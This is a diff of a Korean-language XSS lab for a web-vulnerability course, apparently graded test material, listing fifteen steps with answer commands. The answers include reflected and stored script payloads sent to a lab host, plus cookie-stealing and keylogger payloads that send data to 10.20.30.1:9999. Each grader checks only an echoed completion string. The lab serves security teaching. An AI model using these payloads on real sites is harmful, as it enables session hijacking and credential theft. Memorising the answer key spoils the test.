@@ -1,179 +1,195 @@
-lab_id: "web-vuln-nonai-week03"
-title: "XSS(Cross-Site Scripting) 실습"
-version: "non-ai"
-course: "web-vuln-nonai"
+lab_id: web-vuln-nonai-week03
+title: XSS(Cross-Site Scripting) 실습
+version: non-ai
+course: web-vuln-nonai
 week: 3
-description: "반사형, 저장형, DOM 기반 XSS 공격의 원리와 방어 기법을 실습합니다."
-difficulty: "medium"
+description: 반사형, 저장형, DOM 기반 XSS 공격의 원리와 방어 기법을 실습합니다.
+difficulty: medium
 duration_minutes: 120
 objectives:
-  - "반사형/저장형/DOM XSS를 구분한다"
-  - "XSS 페이로드를 작성하고 테스트한다"
-  - "CSP 등 방어 기법을 이해한다"
+- 반사형/저장형/DOM XSS를 구분한다
+- XSS 페이로드를 작성하고 테스트한다
+- CSP 등 방어 기법을 이해한다
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 반사형 XSS를 테스트하시오."
-    hint: "URL 파라미터에 script 태그를 삽입하세요."
-    category: "xss_reflected"
-    points: 8
-    answer: "curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null | head -20 && echo '반사형 XSS 테스트 완료'"
-    answer_detail: "반사형 XSS는 사용자 입력이 즉시 응답에 반영될 때 발생합니다."
-    verify:
-      type: "output_contains"
-      expect: "반사형 XSS 테스트 완료"
-      field: "stdout"
-  - order: 2
-    instruction: "다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용."
-    hint: "HTML 이벤트 핸들러를 사용하세요."
-    category: "xss_reflected"
-    points: 10
-    answer: "curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null | head -10 && echo 'XSS 페이로드 테스트 완료'"
-    answer_detail: "img onerror, svg onload, iframe src=javascript: 등 다양한 벡터가 존재합니다."
-    verify:
-      type: "output_contains"
-      expect: "XSS 페이로드 테스트 완료"
-      field: "stdout"
-  - order: 3
-    instruction: "저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입."
-    hint: "POST 요청으로 리뷰를 등록하세요."
-    category: "xss_stored"
-    points: 12
-    answer: "curl -s -X POST http://10.20.30.80/api/Feedbacks -H 'Content-Type: application/json' -d '{\"comment\":\"<script>alert(document.cookie)</script>\",\"rating\":5}' 2>/dev/null | head -10 && echo '저장형 XSS 테스트 완료'"
-    answer_detail: "저장형 XSS는 DB에 저장되어 다른 사용자가 페이지를 볼 때마다 실행되므로 더 위험합니다."
-    verify:
-      type: "output_contains"
-      expect: "저장형 XSS 테스트 완료"
-      field: "stdout"
-  - order: 4
-    instruction: "DOM 기반 XSS 취약점을 찾으시오."
-    hint: "JavaScript 소스에서 innerHTML, document.write, eval 등을 검색하세요."
-    category: "xss_dom"
-    points: 10
-    answer: "curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\\.write|eval\\()' | sort -u && echo 'DOM XSS 분석 완료'"
-    answer_detail: "DOM XSS는 서버 응답 없이 클라이언트 JavaScript에서 발생합니다."
-    verify:
-      type: "output_contains"
-      expect: "DOM XSS 분석 완료"
-      field: "stdout"
-  - order: 5
-    instruction: "XSS로 쿠키를 탈취하는 페이로드를 작성하시오."
-    hint: "document.cookie를 외부로 전송하는 스크립트를 작성하세요."
-    category: "xss_exploit"
-    points: 10
-    answer: "echo '<script>new Image().src=\"http://10.20.30.1:9999/steal?c=\"+document.cookie</script>' && echo '쿠키 탈취 페이로드 작성 완료'"
-    answer_detail: "XSS로 세션 쿠키를 탈취하면 세션 하이재킹이 가능합니다."
-    verify:
-      type: "output_contains"
-      expect: "쿠키 탈취 페이로드 작성 완료"
-      field: "stdout"
-  - order: 6
-    instruction: "XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합."
-    hint: "HTML 엔티티, URL 인코딩을 활용하세요."
-    category: "xss_bypass"
-    points: 12
-    answer: "echo '대소문자: <ScRiPt>alert(1)</sCrIpT>' && echo 'HTML 엔티티: &#60;script&#62;' && echo 'XSS 우회 기법 테스트 완료'"
-    answer_detail: "블랙리스트 기반 필터는 인코딩, 대소문자 혼합, 이벤트 핸들러 등으로 우회할 수 있습니다."
-    verify:
-      type: "output_contains"
-      expect: "XSS 우회 기법 테스트 완료"
-      field: "stdout"
-  - order: 7
-    instruction: "Content-Security-Policy(CSP) 헤더를 분석하시오."
-    hint: "응답 헤더에서 CSP를 확인하세요."
-    category: "xss_defense"
-    points: 10
-    answer: "curl -sI http://10.20.30.80 | grep -i 'content-security-policy' && echo 'CSP 분석 완료' || echo 'CSP 미설정 확인 완료'"
-    answer_detail: "CSP는 인라인 스크립트 실행과 외부 리소스 로딩을 제한하여 XSS를 방어합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 8
-    instruction: "XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오."
-    hint: "addEventListener로 키 입력을 캡처하세요."
-    category: "xss_exploit"
-    points: 10
-    answer: "echo '<script>document.addEventListener(\"keypress\",function(e){new Image().src=\"http://10.20.30.1:9999/log?k=\"+e.key})</script>' && echo '키로거 페이로드 작성 완료'"
-    answer_detail: "XSS 키로거는 사용자의 패스워드, 신용카드 번호 등을 실시간으로 탈취할 수 있습니다."
-    verify:
-      type: "output_contains"
-      expect: "키로거 페이로드 작성 완료"
-      field: "stdout"
-  - order: 9
-    instruction: "XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오."
-    hint: "innerHTML로 가짜 로그인 폼을 삽입하세요."
-    category: "xss_exploit"
-    points: 10
-    answer: "echo '피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입' && echo '피싱 페이로드 작성 완료'"
-    answer_detail: "XSS 피싱은 원본 도메인에서 실행되므로 사용자가 의심하기 어렵습니다."
-    verify:
-      type: "output_contains"
-      expect: "피싱 페이로드 작성 완료"
-      field: "stdout"
-  - order: 10
-    instruction: "JavaScript 프레임워크별 XSS 벡터를 분석하시오."
-    hint: "Angular, React 등의 XSS 벡터를 정리하세요."
-    category: "xss_advanced"
-    points: 10
-    answer: "echo '=== 프레임워크별 XSS ===' && echo 'Angular: 템플릿 인젝션' && echo 'React: dangerouslySetInnerHTML' && echo 'Vue: v-html 디렉티브' && echo '프레임워크 XSS 분석 완료'"
-    answer_detail: "각 프레임워크는 고유한 XSS 벡터를 가지고 있습니다."
-    verify:
-      type: "output_contains"
-      expect: "프레임워크 XSS 분석 완료"
-      field: "stdout"
-  - order: 11
-    instruction: "XSS Polyglot 페이로드를 작성하시오."
-    hint: "여러 컨텍스트에서 동작하는 범용 페이로드를 만드세요."
-    category: "xss_advanced"
-    points: 10
-    answer: "echo 'Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드' && echo 'Polyglot 작성 완료'"
-    answer_detail: "Polyglot 페이로드는 HTML, JS, CSS 등 여러 컨텍스트에서 동작하도록 설계됩니다."
-    verify:
-      type: "output_contains"
-      expect: "Polyglot 작성 완료"
-      field: "stdout"
-  - order: 12
-    instruction: "자동화된 XSS 스캐닝을 수행하시오."
-    hint: "XSS 페이로드 목록을 사용하세요."
-    category: "xss_tool"
-    points: 10
-    answer: "echo '자동 XSS 스캐너: 페이로드 3개 테스트 완료' && echo '자동 XSS 스캔 완료'"
-    answer_detail: "자동 스캐닝은 많은 페이로드를 빠르게 테스트할 수 있습니다."
-    verify:
-      type: "output_contains"
-      expect: "자동 XSS 스캔 완료"
-      field: "stdout"
-  - order: 13
-    instruction: "XSS 방어 전략을 종합 정리하시오."
-    hint: "입력 검증, 출력 인코딩, CSP를 포함하세요."
-    category: "xss_defense"
-    points: 10
-    answer: "echo '=== XSS 방어 전략 ===' && echo '1. 출력 인코딩(HTML Entity)' && echo '2. 입력 검증(화이트리스트)' && echo '3. CSP 헤더 적용' && echo '4. HttpOnly 쿠키' && echo 'XSS 방어 정리 완료'"
-    answer_detail: "출력 인코딩이 가장 중요한 방어 수단이며, CSP로 2차 방어를 구성합니다."
-    verify:
-      type: "output_contains"
-      expect: "XSS 방어 정리 완료"
-      field: "stdout"
-  - order: 14
-    instruction: "XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오."
-    hint: "주요 입력 포인트에 페이로드를 자동 삽입하세요."
-    category: "xss_tool"
-    points: 12
-    answer: "echo '#!/bin/bash' && echo 'TARGETS=(\"search\" \"comment\" \"name\")' && echo 'PAYLOAD=\"<script>alert(1)</script>\"' && echo 'XSS 자동화 스크립트 설계 완료'"
-    answer_detail: "자동화 스크립트는 다양한 입력 포인트에 체계적으로 페이로드를 테스트합니다."
-    verify:
-      type: "output_contains"
-      expect: "XSS 자동화 스크립트 설계 완료"
-      field: "stdout"
-  - order: 15
-    instruction: "XSS 실습 종합 보고서를 작성하시오."
-    hint: "발견 취약점, 유형, 영향, 조치를 포함하세요."
-    category: "verification"
-    points: 8
-    answer: "echo '=== XSS 분석 보고서 ===' && echo '대상: http://10.20.30.80' && echo '발견: 반사형/저장형/DOM XSS' && echo '영향: 세션탈취, 피싱, 키로깅' && echo '조치: 출력 인코딩, CSP 적용' && echo '=== 보고서 완료 ==='"
-    answer_detail: "XSS는 웹 애플리케이션에서 가장 흔한 취약점 중 하나입니다."
-    verify:
-      type: "output_contains"
-      expect: "보고서 완료"
-      field: "stdout"
+- order: 1
+  instruction: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 반사형 XSS를 테스트하시오.
+  hint: URL 파라미터에 script 태그를 삽입하세요.
+  category: xss_reflected
+  points: 8
+  answer: curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null | head -20 && echo '반사형 XSS 테스트 완료'
+  answer_detail: 반사형 XSS는 사용자 입력이 즉시 응답에 반영될 때 발생합니다.
+  verify:
+    type: output_contains
+    expect: 반사형 XSS 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 2
+  instruction: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.'
+  hint: HTML 이벤트 핸들러를 사용하세요.
+  category: xss_reflected
+  points: 10
+  answer: curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null | head -10 && echo 'XSS 페이로드 테스트 완료'
+  answer_detail: 'img onerror, svg onload, iframe src=javascript: 등 다양한 벡터가 존재합니다.'
+  verify:
+    type: output_contains
+    expect: XSS 페이로드 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 3
+  instruction: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.'
+  hint: POST 요청으로 리뷰를 등록하세요.
+  category: xss_stored
+  points: 12
+  answer: 'curl -s -X POST http://10.20.30.80/api/Feedbacks -H ''Content-Type: application/json'' -d ''{"comment":"<script>alert(document.cookie)</script>","rating":5}'' 2>/dev/null | head -10 && echo ''저장형
+    XSS 테스트 완료'''
+  answer_detail: 저장형 XSS는 DB에 저장되어 다른 사용자가 페이지를 볼 때마다 실행되므로 더 위험합니다.
+  verify:
+    type: output_contains
+    expect: 저장형 XSS 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 4
+  instruction: DOM 기반 XSS 취약점을 찾으시오.
+  hint: JavaScript 소스에서 innerHTML, document.write, eval 등을 검색하세요.
+  category: xss_dom
+  points: 10
+  answer: curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\.write|eval\()' | sort -u && echo 'DOM XSS 분석 완료'
+  answer_detail: DOM XSS는 서버 응답 없이 클라이언트 JavaScript에서 발생합니다.
+  verify:
+    type: output_contains
+    expect: DOM XSS 분석 완료
+    field: stdout
+  target_vm: attacker
+- order: 5
+  instruction: XSS로 쿠키를 탈취하는 페이로드를 작성하시오.
+  hint: document.cookie를 외부로 전송하는 스크립트를 작성하세요.
+  category: xss_exploit
+  points: 10
+  answer: echo '<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>' && echo '쿠키 탈취 페이로드 작성 완료'
+  answer_detail: XSS로 세션 쿠키를 탈취하면 세션 하이재킹이 가능합니다.
+  verify:
+    type: output_contains
+    expect: 쿠키 탈취 페이로드 작성 완료
+    field: stdout
+  target_vm: attacker
+- order: 6
+  instruction: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합.'
+  hint: HTML 엔티티, URL 인코딩을 활용하세요.
+  category: xss_bypass
+  points: 12
+  answer: 'echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;'' && echo ''XSS 우회 기법 테스트 완료'''
+  answer_detail: 블랙리스트 기반 필터는 인코딩, 대소문자 혼합, 이벤트 핸들러 등으로 우회할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: XSS 우회 기법 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 7
+  instruction: Content-Security-Policy(CSP) 헤더를 분석하시오.
+  hint: 응답 헤더에서 CSP를 확인하세요.
+  category: xss_defense
+  points: 10
+  answer: curl -sI http://10.20.30.80 | grep -i 'content-security-policy' && echo 'CSP 분석 완료' || echo 'CSP 미설정 확인 완료'
+  answer_detail: CSP는 인라인 스크립트 실행과 외부 리소스 로딩을 제한하여 XSS를 방어합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+  target_vm: attacker
+- order: 8
+  instruction: XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
+  hint: addEventListener로 키 입력을 캡처하세요.
+  category: xss_exploit
+  points: 10
+  answer: echo '<script>document.addEventListener("keypress",function(e){new Image().src="http://10.20.30.1:9999/log?k="+e.key})</script>' && echo '키로거 페이로드 작성 완료'
+  answer_detail: XSS 키로거는 사용자의 패스워드, 신용카드 번호 등을 실시간으로 탈취할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: 키로거 페이로드 작성 완료
+    field: stdout
+  target_vm: attacker
+- order: 9
+  instruction: XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오.
+  hint: innerHTML로 가짜 로그인 폼을 삽입하세요.
+  category: xss_exploit
+  points: 10
+  answer: 'echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱 페이로드 작성 완료'''
+  answer_detail: XSS 피싱은 원본 도메인에서 실행되므로 사용자가 의심하기 어렵습니다.
+  verify:
+    type: output_contains
+    expect: 피싱 페이로드 작성 완료
+    field: stdout
+  target_vm: attacker
+- order: 10
+  instruction: JavaScript 프레임워크별 XSS 벡터를 분석하시오.
+  hint: Angular, React 등의 XSS 벡터를 정리하세요.
+  category: xss_advanced
+  points: 10
+  answer: 'echo ''=== 프레임워크별 XSS ==='' && echo ''Angular: 템플릿 인젝션'' && echo ''React: dangerouslySetInnerHTML'' && echo ''Vue: v-html 디렉티브'' && echo ''프레임워크 XSS 분석 완료'''
+  answer_detail: 각 프레임워크는 고유한 XSS 벡터를 가지고 있습니다.
+  verify:
+    type: output_contains
+    expect: 프레임워크 XSS 분석 완료
+    field: stdout
+  target_vm: attacker
+- order: 11
+  instruction: XSS Polyglot 페이로드를 작성하시오.
+  hint: 여러 컨텍스트에서 동작하는 범용 페이로드를 만드세요.
+  category: xss_advanced
+  points: 10
+  answer: 'echo ''Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드'' && echo ''Polyglot 작성 완료'''
+  answer_detail: Polyglot 페이로드는 HTML, JS, CSS 등 여러 컨텍스트에서 동작하도록 설계됩니다.
+  verify:
+    type: output_contains
+    expect: Polyglot 작성 완료
+    field: stdout
+  target_vm: attacker
+- order: 12
+  instruction: 자동화된 XSS 스캐닝을 수행하시오.
+  hint: XSS 페이로드 목록을 사용하세요.
+  category: xss_tool
+  points: 10
+  answer: 'echo ''자동 XSS 스캐너: 페이로드 3개 테스트 완료'' && echo ''자동 XSS 스캔 완료'''
+  answer_detail: 자동 스캐닝은 많은 페이로드를 빠르게 테스트할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: 자동 XSS 스캔 완료
+    field: stdout
+  target_vm: attacker
+- order: 13
+  instruction: XSS 방어 전략을 종합 정리하시오.
+  hint: 입력 검증, 출력 인코딩, CSP를 포함하세요.
+  category: xss_defense
+  points: 10
+  answer: echo '=== XSS 방어 전략 ===' && echo '1. 출력 인코딩(HTML Entity)' && echo '2. 입력 검증(화이트리스트)' && echo '3. CSP 헤더 적용' && echo '4. HttpOnly 쿠키' && echo 'XSS 방어 정리 완료'
+  answer_detail: 출력 인코딩이 가장 중요한 방어 수단이며, CSP로 2차 방어를 구성합니다.
+  verify:
+    type: output_contains
+    expect: XSS 방어 정리 완료
+    field: stdout
+  target_vm: attacker
+- order: 14
+  instruction: XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오.
+  hint: 주요 입력 포인트에 페이로드를 자동 삽입하세요.
+  category: xss_tool
+  points: 12
+  answer: echo '#!/bin/bash' && echo 'TARGETS=("search" "comment" "name")' && echo 'PAYLOAD="<script>alert(1)</script>"' && echo 'XSS 자동화 스크립트 설계 완료'
+  answer_detail: 자동화 스크립트는 다양한 입력 포인트에 체계적으로 페이로드를 테스트합니다.
+  verify:
+    type: output_contains
+    expect: XSS 자동화 스크립트 설계 완료
+    field: stdout
+  target_vm: attacker
+- order: 15
+  instruction: XSS 실습 종합 보고서를 작성하시오.
+  hint: 발견 취약점, 유형, 영향, 조치를 포함하세요.
+  category: verification
+  points: 8
+  answer: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: 반사형/저장형/DOM XSS'' && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩, CSP 적용'' && echo ''=== 보고서 완료 ==='''
+  answer_detail: XSS는 웹 애플리케이션에서 가장 흔한 취약점 중 하나입니다.
+  verify:
+    type: output_contains
+    expect: 보고서 완료
+    field: stdout
+  target_vm: attacker
